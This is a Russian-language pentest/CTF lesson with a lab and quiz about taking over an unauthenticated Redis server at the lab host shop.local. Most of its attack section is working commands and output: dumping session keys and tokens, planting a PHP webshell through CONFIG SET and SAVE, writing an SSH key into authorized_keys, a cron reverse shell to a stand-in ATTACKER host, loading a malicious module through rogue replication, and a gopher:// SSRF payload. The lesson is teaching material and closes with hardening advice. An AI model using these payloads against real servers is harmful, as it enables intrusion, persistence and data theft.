---
id: db-redis
title: "Redis: анонимный доступ, запись файлов и RCE"
category: web
parent: web-nosql-dbms
difficulty: hard
order: 2
tags: [redis, nosql, rce, config, bgsave, module, replication, ssrf, gopher]
prerequisites: [web-nosql-injection, web-nosql-dbms]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 55
summary: "Redis от PING до RCE: анонимный доступ на 6379, дамп ключей, webshell через CONFIG+SAVE, запись authorized_keys/cron, MODULE LOAD, master-slave replication и SSRF через gopher."
lab:
  kind: shell
  title: 'Практика: Redis — анонимный дамп и webshell'
  toolset: [core, redis-cli, curl]
  workdir: /home/student/task
  files: [task.md]
  check: 'grep -q ''nto{'' found.txt'
  hints:
    - 'Проверь доступ: `redis-cli -u redis://shop.local:6379 PING` → `PONG`.'
    - 'Карта: `INFO server`, `INFO keyspace`.'
    - 'Перечисли ключи: `redis-cli -u redis://shop.local:6379 --scan`; секрет ищи в `secret:*`.'
    - 'Прочитай значение: `redis-cli -u redis://shop.local:6379 GET secret:flag`.'
---

## Задача

В прошлом уроке мы нашли у `shop.local` три открытых порта хранилищ. Теперь идём в Redis — и хотим не просто почитать ключи, а получить **выполнение команд** на сервере. Redis для этого идеален: у него нет схемы, исторически нет пароля, и он умеет писать файлы на диск. Разберём путь от `PING` до RCE.

## Данные, с которыми работаем

Порт 6379 открыт. Проверяем одной командой:

```bash
$ redis-cli -h shop.local -p 6379 PING
PONG
```

`PONG` — сервер жив и **не требует пароля** (`requirepass` не задан). Если бы пароль был, ответ был бы `(error) NOAUTH Authentication required`. `redis-cli` — это клиент Redis, а `PONG` — ответ на команду `PING`, встроенную «проверку живости».

Если `redis-cli` нет под рукой, годится `nc` — протокол Redis текстовый:

```bash
$ printf 'PING\r\n' | nc -w3 shop.local 6379
+PONG
```

## Шаг 1: собираем карту — версия, конфиг, ключи

`INFO` отдаёт версию, ОС и путь к конфигу:

```bash
$ redis-cli -h shop.local INFO server | grep -E 'redis_version|os|config_file'
redis_version:7.0.11
os:Linux 5.15.0 x86_64
config_file:/etc/redis/redis.conf

$ redis-cli -h shop.local INFO keyspace
db0:keys=1240,expires=12
```

1240 ключей в базе `db0`. Смотрим конфиг — это карта для записи файлов:

```bash
$ redis-cli -h shop.local CONFIG GET dir
1) "dir"
2) "/var/lib/redis"
$ redis-cli -h shop.local CONFIG GET dbfilename
1) "dbfilename"
2) "dump.rdb"
```

`dir` — рабочий каталог, `dbfilename` — имя файла дампа. **RDB** (Redis Database) — это снимок всей базы, который Redis сохраняет на диск. Мы можем поменять и путь, и имя — а значит, записать файл куда угодно.

## Шаг 2: дампим ключи

Сначала перечисляем, потом читаем по типу:

```bash
$ redis-cli -h shop.local --scan --pattern 'sess:*'
sess:9f2a1c
sess:44b0de
$ redis-cli -h shop.local GET sess:9f2a1c
{"uid":1,"role":"admin"}
```

Массовый дамп и поиск секретов:

```bash
$ redis-cli -h shop.local --scan | while read k; do
>   t=$(redis-cli -h shop.local TYPE "$k")
>   [ "$t" = "string" ] && echo "$k = $(redis-cli -h shop.local GET "$k")"
> done | tee redis_dump.txt
$ grep -iE 'pass|token|secret|jwt' redis_dump.txt
admin:reset_token = 8f3a1b9c...
```

`--scan` безопаснее `KEYS *`: на большой базе `KEYS` блокирует сервер, а `SCAN` идёт курсором.

## Шаг 3: webshell через CONFIG SET + SAVE

Идея: заставить Redis сохранить RDB-дамп в **веб-корень** под именем `.php`, а содержимым ключа сделать PHP-код.

```bash
$ redis-cli -h shop.local CONFIG SET dir /var/www/html
OK
$ redis-cli -h shop.local CONFIG SET dbfilename shell.php
OK
$ redis-cli -h shop.local SET x '<?php system($_GET["c"]); ?>'
OK
$ redis-cli -h shop.local SAVE
OK
```

Теперь проверяем:

```bash
$ curl -s 'https://shop.local/shell.php?c=id'
uid=33(www-data) gid=33(www-data)
```

Мы получили **webshell** — страницу, которая выполняет переданную команду. `SAVE` пишет дамп синхронно (блокируя сервер); `BGSAVE` — в фоне.

Важная тонкость: RDB-файл начинается с сигнатуры `REDIS...`, и код надо ставить так, чтобы он оказался валидным PHP. Если дамп сжимается, PHP-код портится — тогда `CONFIG SET rdbcompression no` или код в самое начало значения.

## Шаг 4: если веб-корень недоступен — SSH-ключ или cron

Тот же приём, но пишем файл, который даёт исполнение.

**SSH-ключ.** Сначала создаём пару на своей машине:

```bash
$ ssh-keygen -t ed25519 -f ./id_redis -N ''
$ cat ./id_redis.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... redis@attacker
```

Потом пишем публичный ключ в `authorized_keys` цели:

```bash
$ redis-cli -h shop.local CONFIG SET dir /root/.ssh
$ redis-cli -h shop.local CONFIG SET dbfilename authorized_keys
$ redis-cli -h shop.local SET x '\n\nssh-ed25519 AAAAC3... redis@attacker\n\n'
$ redis-cli -h shop.local SAVE
$ ssh -i ./id_redis root@shop.local
```

**Cron.** Кладём задачу в `/var/spool/cron`, имя файла — `root`:

```bash
$ redis-cli -h shop.local CONFIG SET dir /var/spool/cron
$ redis-cli -h shop.local CONFIG SET dbfilename root
$ redis-cli -h shop.local SET x '\n\n* * * * * bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"\n\n'
$ redis-cli -h shop.local SAVE
```

Через минуту приходит обратная оболочка. Альтернативные каталоги: `/etc/cron.d/`, `/var/spool/cron/crontabs/`. Права зависят от того, под кем запущен Redis (обычно `redis`, но `/var/www` часто доступен).

## Шаг 5: MODULE LOAD и репликация

С версии 4.0 Redis умеет **модули** — нативные `.so`, которые могут всё. Если команда не запрещена, загружаем свой модуль:

```bash
$ redis-cli -h shop.local MODULE LIST
(empty array)
$ redis-cli -h shop.local MODULE LOAD /tmp/module.so
OK
$ redis-cli -h shop.local system.exec 'id'
uid=0(root) gid=0(root)
```

Если `enable-module-command` выключен (в Redis 7 по умолчанию `no`), идём через **репликацию**: заставляем цель считать наш сервер мастером и подтянуть RDB с модулем.

```bash
$ redis-cli -h shop.local SLAVEOF ATTACKER 21000
$ redis-cli -h shop.local MODULE LOAD ./exp.so
$ redis-cli -h shop.local SLAVEOF NO ONE
```

`SLAVEOF` (в новых версиях `REPLICAOF`) — «будь репликой того сервера». Цель сама скачивает наш дамп, внутри которого лежит модуль.

## Шаг 6: если Redis только внутри — SSRF через gopher

Порт может быть закрыт снаружи, но достижим приложением. Тогда отправляем RESP-команды через SSRF-схему `gopher://`, где каждая строка кончается `%0d%0a` (CRLF):

```
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html%0d%0ACONFIG%20SET%20dbfilename%20s.php%0d%0ASET%20x%20%22%3C%3Fphp%20system(%24_GET%5B%22c%22%5D)%3B%20%3F%3E%22%0d%0ASAVE%0d%0A
```

Это тот же webshell, но доставленный через уязвимый к SSRF эндпоинт. Разбор SSRF — в ветке `web-ssrf`.

## Почему Redis умеет писать файлы: RDB как побочный эффект

Чтобы понять, почему Redis так легко превращается в RCE, надо знать одну вещь о его модели хранения. Redis держит все данные в оперативной памяти — это его суть. Но чтобы данные не терялись при перезапуске, он периодически **сохраняет снимок** всей базы на диск в файл формата RDB. И вот ключевое: путь и имя этого файла задаются не при сборке, а через команды `CONFIG SET dir` и `CONFIG SET dbfilename` в рантайме.

Из этого следует прямая цепочка. Раз мы можем менять путь, мы можем направить снимок в любой каталог, куда у процесса Redis есть право записи. Раз мы можем менять имя, мы можем назвать файл так, чтобы его подхватил другой сервис — `shell.php`, `authorized_keys`, `root` в cron-каталоге. А раз содержимое ключей попадает в снимок, мы можем записать в файл произвольные байты: PHP-код, SSH-ключ, строку cron.

Это не «баг Redis» в привычном смысле, а следствие дизайна: у Redis нет понятия «файловая система для пользователя», но есть команды управления своим хранилищем. Когда к ним имеет доступ анонимный клиент, они становятся примитивом записи файлов. Именно поэтому первое, что делают при hardening, — закрывают `CONFIG` через `rename-command CONFIG ""`.

Есть и тонкость с форматом. RDB-файл — это бинарный дамп с сигнатурой `REDIS`, служебными полями и сжатием. Если просто записать PHP-код как значение ключа, он окажется где-то в середине файла, среди мусорных байтов. Интерпретатор PHP выполнит код только если тот корректен в контексте — поэтому на практике либо отключают сжатие (`rdbcompression no`), либо подбирают значение так, чтобы после открывающего тега всё было валидным. Понимание этого экономит время, когда webshell «создался, но не работает».

И последнее: почему `SAVE`, а не `BGSAVE`. `SAVE` сохраняет синхронно, блокируя сервер, но файл появляется сразу — удобно для проверки. `BGSAVE` делает то же в фоне, сервер не блокируется, но между командой и появлением файла есть задержка. Выбор между ними — компромисс между скоростью проверки и риском для живого сервиса.

Наконец, всегда фиксируй версию и конфигурацию: от них зависит, какие команды вообще доступны. В Redis 7 часть опасных команд переименована или выключена по умолчанию, а `MODULE LOAD` требует отдельного разрешения — и то, что сработало на 5.x, на 7.x может молча не пройти.

<!-- lab -->

## Что мы теперь знаем

- Redis без `requirepass` даёт полный доступ: `PING` → `PONG` значит «анонимно».
- `INFO`/`CONFIG GET`/`KEYS` дают версию, каталог, имя дампа и содержимое.
- `CONFIG SET dir`/`dbfilename` + `SET` + `SAVE` пишут произвольный файл — это webshell, SSH-ключ или cron.
- `MODULE LOAD` даёт нативный RCE; при запрете — `SLAVEOF` с подсунутым RDB.
- Внутренний Redis атакуют через SSRF-`gopher://`.

## На что смотреть дальше

- **`dbfilename` без `/`.** Путь задаётся только через `dir`; имя файла — без слешей.
- **Сжатие RDB.** Если webshell «не выполняется» — `CONFIG SET rdbcompression no` или ставь код в начало.
- **Права каталога.** `/root/.ssh` доступен не всегда; пробуй `/var/www`, `/tmp`, `/home/*`.
- **`SAVE` блокирует.** На боевом предпочитай `BGSAVE` и учитывай задержку появления файла.
- **Разрушительное — с согласия.** `FLUSHALL`/`FLUSHDB` стирают данные; не выполняй без разрешения.

## Квиз

Проверь себя.

```quiz
- question: "Что означает ответ `PONG` на `PING` в Redis?"
  options:
    - "Сервер защищён паролем"
    - "Сервер жив и не требует аутентификации"
    - "Это не Redis"
    - "Сервер в режиме только-чтение"
  answer: 1
  explanation: "Если бы был `requirepass`, ответ был бы `NOAUTH`."
- question: "Какая пара команд пишет файл на диск в Redis?"
  options:
    - "`SELECT` и `GET`"
    - "`CONFIG SET dir`/`dbfilename` и `SAVE`"
    - "`AUTH` и `PING`"
    - "`EVAL` и `MGET`"
  answer: 1
  explanation: "Меняем каталог и имя RDB-дампа, кладём код в ключ и сохраняем."
- question: "Куда записать файл, чтобы получить доступ по SSH?"
  options:
    - "`/var/www/html/shell.php`"
    - "`/root/.ssh/authorized_keys`"
    - "`/etc/hosts`"
    - "`/tmp/dump.rdb`"
  answer: 1
  explanation: "Публичный ключ в `authorized_keys` даёт вход по SSH."
- question: "Что делает `SLAVEOF ATTACKER 21000`?"
  options:
    - "Удаляет все ключи"
    - "Заставляет Redis считать наш сервер мастером и подтянуть RDB"
    - "Меняет пароль"
    - "Выгружает базу"
  answer: 1
  explanation: "Репликация позволяет доставить модуль и затем `MODULE LOAD`."
- question: "Как атаковать Redis, закрытый снаружи, но доступный приложению?"
  options:
    - "Через SSRF-`gopher://`"
    - "Через `nmap`"
    - "Через `curl -I`"
    - "Никак"
  answer: 0
  explanation: "`gopher://` доставляет RESP-команды с CRLF через SSRF-эндпоинт."
```

## Куда дальше

Redis — самый прямой путь к RCE среди NoSQL, потому что пишет файлы. В следующем уроке `db-elasticsearch` — там другая история: HTTP/JSON, индексы и скрипты `painless`, а также старые CVE в Kibana. А пока главное запомни: открытый Redis — это не «утечка кэша», а потенциальное выполнение кода на сервере.

## Где пригодится

- **CTF (Web):** открытый Redis и webshell через `CONFIG`+`SAVE` — классика, часто финальный шаг до флага.
- **Bug bounty:** анонимный Redis с токенами сессий и запись файлов — critical.
- **Пентест:** Redis почти всегда стоит рядом с приложением; `PING`/`INFO` — первые команды триажа.
- **Работа (AppSec):** `requirepass`, bind на localhost, `rename-command CONFIG`, отключение модулей — обязательный hardening.
